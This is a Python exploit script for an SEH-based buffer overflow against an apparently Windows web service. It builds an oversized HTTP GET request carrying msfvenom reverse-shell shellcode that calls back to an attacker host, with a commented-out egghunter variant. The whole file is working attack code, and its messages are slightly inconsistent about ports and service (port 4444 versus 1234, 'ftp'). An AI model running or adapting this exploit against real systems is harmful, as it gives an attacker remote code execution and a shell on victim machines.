import struct
import socket
from pwn import *
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread -b "\x00\x20\x2f\x5c\x25\x2b" lhost=192.168.1.1 lport=1234 -f python -v shellcode
shellcode =  b""
shellcode += b"\xdb\xce\xd9\x74\x24\xf4\xb8\x4c\xc9\x61\xeb"
shellcode += b"\x5f\x31\xc9\xb1\x52\x83\xc7\x04\x31\x47\x13"
shellcode += b"\x03\x0b\xda\x83\x1e\x6f\x34\xc1\xe1\x8f\xc5"
shellcode += b"\xa6\x68\x6a\xf4\xe6\x0f\xff\xa7\xd6\x44\xad"
shellcode += b"\x4b\x9c\x09\x45\xdf\xd0\x85\x6a\x68\x5e\xf0"
shellcode += b"\x45\x69\xf3\xc0\xc4\xe9\x0e\x15\x26\xd3\xc0"
shellcode += b"\x68\x27\x14\x3c\x80\x75\xcd\x4a\x37\x69\x7a"
shellcode += b"\x06\x84\x02\x30\x86\x8c\xf7\x81\xa9\xbd\xa6"
shellcode += b"\x9a\xf3\x1d\x49\x4e\x88\x17\x51\x93\xb5\xee"
shellcode += b"\xea\x67\x41\xf1\x3a\xb6\xaa\x5e\x03\x76\x59"
shellcode += b"\x9e\x44\xb1\x82\xd5\xbc\xc1\x3f\xee\x7b\xbb"
shellcode += b"\x9b\x7b\x9f\x1b\x6f\xdb\x7b\x9d\xbc\xba\x08"
shellcode += b"\x91\x09\xc8\x56\xb6\x8c\x1d\xed\xc2\x05\xa0"
shellcode += b"\x21\x43\x5d\x87\xe5\x0f\x05\xa6\xbc\xf5\xe8"
shellcode += b"\xd7\xde\x55\x54\x72\x95\x78\x81\x0f\xf4\x14"
shellcode += b"\x66\x22\x06\xe5\xe0\x35\x75\xd7\xaf\xed\x11"
shellcode += b"\x5b\x27\x28\xe6\x9c\x12\x8c\x78\x63\x9d\xed"
shellcode += b"\x51\xa0\xc9\xbd\xc9\x01\x72\x56\x09\xad\xa7"
shellcode += b"\xf9\x59\x01\x18\xba\x09\xe1\xc8\x52\x43\xee"
shellcode += b"\x37\x42\x6c\x24\x50\xe9\x97\xaf\x9f\x46\x96"
shellcode += b"\x2e\x48\x95\x98\x34\x5a\x10\x7e\x5e\x4a\x75"
shellcode += b"\x29\xf7\xf3\xdc\xa1\x66\xfb\xca\xcc\xa9\x77"
shellcode += b"\xf9\x31\x67\x70\x74\x21\x10\x70\xc3\x1b\xb7"
shellcode += b"\x8f\xf9\x33\x5b\x1d\x66\xc3\x12\x3e\x31\x94"
shellcode += b"\x73\xf0\x48\x70\x6e\xab\xe2\x66\x73\x2d\xcc"
shellcode += b"\x22\xa8\x8e\xd3\xab\x3d\xaa\xf7\xbb\xfb\x33"
shellcode += b"\xbc\xef\x53\x62\x6a\x59\x12\xdc\xdc\x33\xcc"
shellcode += b"\xb3\xb6\xd3\x89\xff\x08\xa5\x95\xd5\xfe\x49"
shellcode += b"\x27\x80\x46\x76\x88\x44\x4f\x0f\xf4\xf4\xb0"
shellcode += b"\xda\xbc\x15\x53\xce\xc8\xbd\xca\x9b\x70\xa0"
shellcode += b"\xec\x76\xb6\xdd\x6e\x72\x47\x1a\x6e\xf7\x42"
shellcode += b"\x66\x28\xe4\x3e\xf7\xdd\x0a\xec\xf8\xf7"

#nseh = "\xeb\xce\x90\x90" # short jmp
nseh = "\xeb\x06\x90\x90"
seh  = p32(0x100161e5)


# \x00\x20\x2f\x5c\x25\x2b

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
'''
payload = "w00tw00t"
payload += shellcode
payload += "A"*(4013-len(payload))
payload += egghunter
payload += "A"*(4061-len(payload))
payload += nseh
payload += seh
payload += "D"*(40677-len(payload)) 
'''

payload = "A"*3813
payload += nseh
payload += "A"*(4061-len(payload))
payload += nseh
payload += seh
payload += 16*"\x90"
payload += shellcode
payload += "D"*(40677-len(payload))
try:
	print "\nSending evil buffer..."
	s.connect(('192.168.1.3',8080))
	s.send("GET /"+payload+" HTTP/1.0\r\n\r\n")
	data = s.recv(1024)
	print data
	s.close()
	print "\nDone! Try connecting to port 4444 on victim machine."
except:
	print "Could not connect to ftp"

